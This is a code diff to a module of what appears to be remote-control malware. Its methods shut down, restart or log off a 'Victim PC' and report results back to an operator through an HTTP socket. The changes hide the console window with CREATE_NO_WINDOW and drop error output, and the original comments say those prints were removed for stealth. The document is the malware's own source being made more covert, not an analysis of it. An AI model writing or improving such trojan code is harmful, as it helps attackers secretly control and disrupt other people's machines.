@@ -1,4 +1,4 @@
-import os, tempfile
+import os, tempfile, subprocess # Ensure subprocess is imported
 from HTTPSocket import HTTPSocket
 
 class ComputerCMD:
@@ -11,42 +11,36 @@ class ComputerCMD:
         When function is called, Shutdown the Victim PC
         """
         try:
-            cmd = "shutdown -s -t 00"
+            cmd = ["shutdown", "-s", "-t", "00"]
+            subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW, check=False)
             self.C.Log("Succ", "Shutdown Command Executed Successfully")
             self.C.Send("CleanCommands")
-            os.system(cmd)
         except Exception as e:
             self.C.Send("CleanCommands")  
-            # print("[Error In ComputerCMD, shutdown() Function]") # Removed for stealth
-            # print(f"[Error] : {e}") # Removed for stealth      
-            self.C.Log("Fail", "An unexpected error occurred " + str(e)) 
+            self.C.Log("Fail", "An unexpected error occurred during shutdown: " + str(e)) 
       
     def restart(self):
         """
         When function is called, Restart the Victim PC
         """
         try:
-            cmd = "shutdown -r -t 00"
+            cmd = ["shutdown", "-r", "-t", "00"]
+            subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW, check=False)
             self.C.Log("Succ", "Restart Command Executed Successfully")
             self.C.Send("CleanCommands")  
-            os.system(cmd)
         except Exception as e:
             self.C.Send("CleanCommands")  
-            # print("[Error In ComputerCMD, restart() Function]") # Removed for stealth         
-            # print(f"[Error] : {e}") # Removed for stealth      
-            self.C.Log("Fail", "An unexpected error occurred " + str(e)) 
+            self.C.Log("Fail", "An unexpected error occurred during restart: " + str(e)) 
 
     def logoff(self):
         """
         When function is called, LogOff the Victim PC
         """
         try:
-            cmd = "shutdown -l"
+            cmd = ["shutdown", "-l"]
+            subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW, check=False)
             self.C.Log("Succ", "LogOff Command Executed Successfully")
             self.C.Send("CleanCommands")   
-            os.system(cmd)
         except Exception as e:
             self.C.Send("CleanCommands")         
-            # print("[Error In ComputerCMD, logoff() Function]") # Removed for stealth         
-            # print(f"[Error] : {e}") # Removed for stealth     
-            self.C.Log("Fail", "An unexpected error occurred " + str(e))
+            self.C.Log("Fail", "An unexpected error occurred during logoff: " + str(e))
